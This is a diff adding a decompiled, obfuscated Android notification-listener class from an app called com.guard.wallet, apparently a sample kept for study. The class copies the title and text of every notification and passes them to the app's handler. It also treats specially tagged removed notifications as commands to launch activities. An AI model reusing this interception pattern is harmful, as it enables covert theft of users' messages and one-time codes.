@@ -1,0 +1,401 @@
+package com.guard.wallet.service;
+
+import a1.q;
+import android.content.Intent;
+import android.os.IBinder;
+import android.service.notification.NotificationListenerService;
+import android.service.notification.StatusBarNotification;
+import android.util.Log;
+import com.guard.wallet.MainApplication;
+import com.guard.wallet.req.MessageRecordVO;
+import com.guard.wallet.resp.DeviceNotificationVO;
+import com.guard.wallet.utils.g;
+import java.util.concurrent.atomic.AtomicBoolean;
+import w.b;
+
+public class CustomNotificationService extends NotificationListenerService {
+   public static volatile CustomNotificationService c;
+   public Integer a = 0;
+   public final AtomicBoolean b = new AtomicBoolean(false);
+
+   public static void a() {
+      // $VF: Couldn't be decompiled
+      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
+      // java.lang.NullPointerException: Cannot invoke "org.jetbrains.java.decompiler.util.collections.fixed.FastFixedSet.contains(Object)" because "predset" is null
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.lambda$removeErroneousNodes$1(FastExtendedPostdominanceHelper.java:231)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.iterateReachability(FastExtendedPostdominanceHelper.java:373)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.removeErroneousNodes(FastExtendedPostdominanceHelper.java:207)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.getExtendedPostdominators(FastExtendedPostdominanceHelper.java:63)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.findGeneralStatement(DomHelper.java:516)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.processStatement(DomHelper.java:451)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.processStatement(DomHelper.java:358)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.parseGraph(DomHelper.java:208)
+      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:166)
+      //
+      // Bytecode:
+      // 00: getstatic com/guard/wallet/service/CustomNotificationService.c Lcom/guard/wallet/service/CustomNotificationService;
+      // 03: ifnull 38
+      // 06: ldc com/guard/wallet/service/CustomNotificationService
+      // 08: monitorenter
+      // 09: getstatic com/guard/wallet/service/CustomNotificationService.c Lcom/guard/wallet/service/CustomNotificationService;
+      // 0c: ifnull 25
+      // 0f: getstatic com/guard/wallet/service/CustomNotificationService.c Lcom/guard/wallet/service/CustomNotificationService;
+      // 12: getfield com/guard/wallet/service/CustomNotificationService.b Ljava/util/concurrent/atomic/AtomicBoolean;
+      // 15: invokevirtual java/util/concurrent/atomic/AtomicBoolean.get ()Z
+      // 18: ifeq 21
+      // 1b: getstatic com/guard/wallet/service/CustomNotificationService.c Lcom/guard/wallet/service/CustomNotificationService;
+      // 1e: invokevirtual android/service/notification/NotificationListenerService.requestUnbind ()V
+      // 21: aconst_null
+      // 22: putstatic com/guard/wallet/service/CustomNotificationService.c Lcom/guard/wallet/service/CustomNotificationService;
+      // 25: ldc com/guard/wallet/service/CustomNotificationService
+      // 27: monitorexit
+      // 28: goto 38
+      // 2b: astore 0
+      // 2c: ldc com/guard/wallet/service/CustomNotificationService
+      // 2e: monitorexit
+      // 2f: aload 0
+      // 30: athrow
+      // 31: astore 0
+      // 32: ldc "MyNotificationListener"
+      // 34: aload 0
+      // 35: invokestatic a1/q.s (Ljava/lang/String;Ljava/lang/Exception;)V
+      // 38: return
+   }
+
+   public final IBinder onBind(Intent var1) {
+      Log.d("MyNotificationListener", "onBind");
+      this.b.set(true);
+      return super.onBind(var1);
+   }
+
+   public final void onDestroy() {
+      super.onDestroy();
+      a();
+   }
+
+   public final void onListenerConnected() {
+      // $VF: Couldn't be decompiled
+      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
+      // java.lang.NullPointerException: Cannot invoke "org.jetbrains.java.decompiler.util.collections.fixed.FastFixedSet.contains(Object)" because "predset" is null
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.lambda$removeErroneousNodes$1(FastExtendedPostdominanceHelper.java:231)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.iterateReachability(FastExtendedPostdominanceHelper.java:373)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.removeErroneousNodes(FastExtendedPostdominanceHelper.java:207)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.FastExtendedPostdominanceHelper.getExtendedPostdominators(FastExtendedPostdominanceHelper.java:63)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.findGeneralStatement(DomHelper.java:516)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.processStatement(DomHelper.java:451)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.processStatement(DomHelper.java:358)
+      //   at org.jetbrains.java.decompiler.modules.decompiler.decompose.DomHelper.parseGraph(DomHelper.java:208)
+      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:166)
+      //
+      // Bytecode:
+      // 00: aload 0
+      // 01: invokespecial android/service/notification/NotificationListenerService.onListenerConnected ()V
+      // 04: aload 0
+      // 05: bipush 1
+      // 06: invokestatic java/lang/Integer.valueOf (I)Ljava/lang/Integer;
+      // 09: putfield com/guard/wallet/service/CustomNotificationService.a Ljava/lang/Integer;
+      // 0c: getstatic com/guard/wallet/service/CustomNotificationService.c Lcom/guard/wallet/service/CustomNotificationService;
+      // 0f: ifnonnull 2b
+      // 12: ldc com/guard/wallet/service/CustomNotificationService
+      // 14: monitorenter
+      // 15: getstatic com/guard/wallet/service/CustomNotificationService.c Lcom/guard/wallet/service/CustomNotificationService;
+      // 18: ifnonnull 1f
+      // 1b: aload 0
+      // 1c: putstatic com/guard/wallet/service/CustomNotificationService.c Lcom/guard/wallet/service/CustomNotificationService;
+      // 1f: ldc com/guard/wallet/service/CustomNotificationService
+      // 21: monitorexit
+      // 22: goto 2b
+      // 25: astore 1
+      // 26: ldc com/guard/wallet/service/CustomNotificationService
+      // 28: monitorexit
+      // 29: aload 1
+      // 2a: athrow
+      // 2b: ldc "MyNotificationListener"
+      // 2d: ldc "onListenerConnected"
+      // 2f: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
+      // 32: pop
+      // 33: invokestatic w/b.a ()V
+      // 36: return
+   }
+
+   public final void onListenerDisconnected() {
+      super.onListenerDisconnected();
+      this.a = 0;
+      Log.d("MyNotificationListener", "onListenerDisconnected");
+      a();
+   }
+
+   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
+   public final void onNotificationPosted(StatusBarNotification var1) {
+      super.onNotificationPosted(var1);
+      this.a = 1;
+
+      label152: {
+         Exception var10000;
+         label156: {
+            DeviceNotificationVO var3;
+            label150: {
+               String var24;
+               label149: {
+                  label148: {
+                     try {
+                        var3 = new DeviceNotificationVO();
+                        var3.setPackageName(var1.getPackageName());
+                        if (q.B(var3.getPackageName())) {
+                           break label150;
+                        }
+
+                        var24 = var3.getPackageName();
+                        if (!g.l() || q.B(var24)) {
+                           break label148;
+                        }
+
+                        var23 = g.d0(var24);
+                     } catch (Exception var19) {
+                        var10000 = var19;
+                        boolean var10001 = false;
+                        break label156;
+                     }
+
+                     if (var23 != null) {
+                        try {
+                           var24 = var23.getApplicationLabel();
+                           break label149;
+                        } catch (Exception var18) {
+                           var10000 = var18;
+                           boolean var26 = false;
+                           break label156;
+                        }
+                     }
+                  }
+
+                  var24 = null;
+               }
+
+               try {
+                  var3.setApplicationLabel(var24);
+               } catch (Exception var17) {
+                  var10000 = var17;
+                  boolean var27 = false;
+                  break label156;
+               }
+            }
+
+            try {
+               String var25 = var1.getTag();
+               if (!q.B(var25)) {
+                  var3.setTag(var25);
+               }
+            } catch (Exception var16) {
+               var10000 = var16;
+               boolean var28 = false;
+               break label156;
+            }
+
+            try {
+               var3.setTag(var1.getTag());
+               var3.setGroupKey(var1.getGroupKey());
+               var3.setPostTime(var1.getPostTime());
+               var20 = var1.getNotification().extras;
+            } catch (Exception var15) {
+               var10000 = var15;
+               boolean var29 = false;
+               break label156;
+            }
+
+            if (var20 != null) {
+               try {
+                  if (var20.containsKey("android.intent.extra.NOTIFICATION_TAG")) {
+                     var3.setExtraTag(var20.getString("android.intent.extra.NOTIFICATION_TAG"));
+                  }
+               } catch (Exception var14) {
+                  var10000 = var14;
+                  boolean var30 = false;
+                  break label156;
+               }
+
+               try {
+                  if (var20.containsKey("android.intent.extra.CHANNEL_ID")) {
+                     var3.setChannelId(var20.getString("android.intent.extra.CHANNEL_ID"));
+                  }
+               } catch (Exception var9) {
+                  var10000 = var9;
+                  boolean var31 = false;
+                  break label156;
+               }
+
+               try {
+                  if (var20.containsKey("android.intent.extra.CHANNEL_GROUP_ID")) {
+                     var3.setChanelGroupId(var20.getString("android.intent.extra.CHANNEL_GROUP_ID"));
+                  }
+               } catch (Exception var13) {
+                  var10000 = var13;
+                  boolean var32 = false;
+                  break label156;
+               }
+
+               try {
+                  if (var20.containsKey("android.title")) {
+                     var3.setTitle(var20.getString("android.title"));
+                  }
+               } catch (Exception var8) {
+                  var10000 = var8;
+                  boolean var33 = false;
+                  break label156;
+               }
+
+               try {
+                  if (var20.containsKey("android.title.big")) {
+                     var3.setBigTitle(var20.getString("android.title.big"));
+                  }
+               } catch (Exception var12) {
+                  var10000 = var12;
+                  boolean var34 = false;
+                  break label156;
+               }
+
+               try {
+                  if (var20.containsKey("android.text")) {
+                     var3.setText(var20.getString("android.text"));
+                  }
+               } catch (Exception var7) {
+                  var10000 = var7;
+                  boolean var35 = false;
+                  break label156;
+               }
+
+               try {
+                  if (var20.containsKey("android.subText")) {
+                     var3.setSubText(var20.getString("android.subText"));
+                  }
+               } catch (Exception var11) {
+                  var10000 = var11;
+                  boolean var36 = false;
+                  break label156;
+               }
+
+               try {
+                  if (var20.containsKey("android.infoText")) {
+                     var3.setInfoText(var20.getString("android.infoText"));
+                  }
+               } catch (Exception var6) {
+                  var10000 = var6;
+                  boolean var37 = false;
+                  break label156;
+               }
+
+               try {
+                  if (var20.containsKey("android.summaryText")) {
+                     var3.setSummaryText(var20.getString("android.summaryText"));
+                  }
+               } catch (Exception var10) {
+                  var10000 = var10;
+                  boolean var38 = false;
+                  break label156;
+               }
+
+               try {
+                  if (var20.containsKey("android.bigText")) {
+                     var3.setBigText(var20.getString("android.bigText"));
+                  }
+               } catch (Exception var5) {
+                  var10000 = var5;
+                  boolean var39 = false;
+                  break label156;
+               }
+            }
+
+            try {
+               MessageRecordVO var22 = new MessageRecordVO();
+               var22.setIntentCode("android.intent.action.NOTIFICATION_POSTED");
+               var22.setExtraBody(var3);
+               if (MainApplication.getInstance() != null && MainApplication.getInstance().getHandlerMsgAndTimer() != null) {
+                  MainApplication.getInstance().getHandlerMsgAndTimer().b(var22);
+               }
+               break label152;
+            } catch (Exception var4) {
+               var10000 = var4;
+               boolean var40 = false;
+            }
+         }
+
+         Exception var21 = var10000;
+         q.s("MyNotificationListener", var21);
+      }
+
+      w.b.a();
+   }
+
+   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
+   public final void onNotificationRemoved(StatusBarNotification var1) {
+      super.onNotificationRemoved(var1);
+      this.a = 1;
+      StringBuilder var3 = new StringBuilder("Notification Removed from PackageName:");
+      var3.append(var1.getPackageName());
+      Log.d("MyNotificationListener", var3.toString());
+      String var8 = var1.getTag();
+      label44:
+      if (!q.B(var8) && var8.startsWith("startActivity:")) {
+         Exception var10000;
+         label46: {
+            int var2;
+            String[] var4;
+            try {
+               if (!var8.startsWith("startActivity:")) {
+                  break label44;
+               }
+
+               var4 = var8.split(":");
+               var2 = var4.length;
+            } catch (Exception var7) {
+               var10000 = var7;
+               boolean var10001 = false;
+               break label46;
+            }
+
+            String var11 = null;
+            String var9;
+            if (var2 >= 2) {
+               var9 = var4[1];
+            } else {
+               var9 = null;
+            }
+
+            label36: {
+               try {
+                  if (var4.length < 3) {
+                     break label36;
+                  }
+               } catch (Exception var6) {
+                  var10000 = var6;
+                  boolean var12 = false;
+                  break label46;
+               }
+
+               var11 = var4[2];
+            }
+
+            try {
+               if (!q.B(var9)) {
+                  g.Y0(var9, var11);
+               }
+               break label44;
+            } catch (Exception var5) {
+               var10000 = var5;
+               boolean var13 = false;
+            }
+         }
+
+         Exception var10 = var10000;
+         q.s("MyNotificationListener", var10);
+      }
+
+      w.b.a();
+   }
+
+   public final boolean onUnbind(Intent var1) {
+      Log.d("MyNotificationListener", "onUnbind");
+      this.b.set(false);
+      return super.onUnbind(var1);
+   }
+}
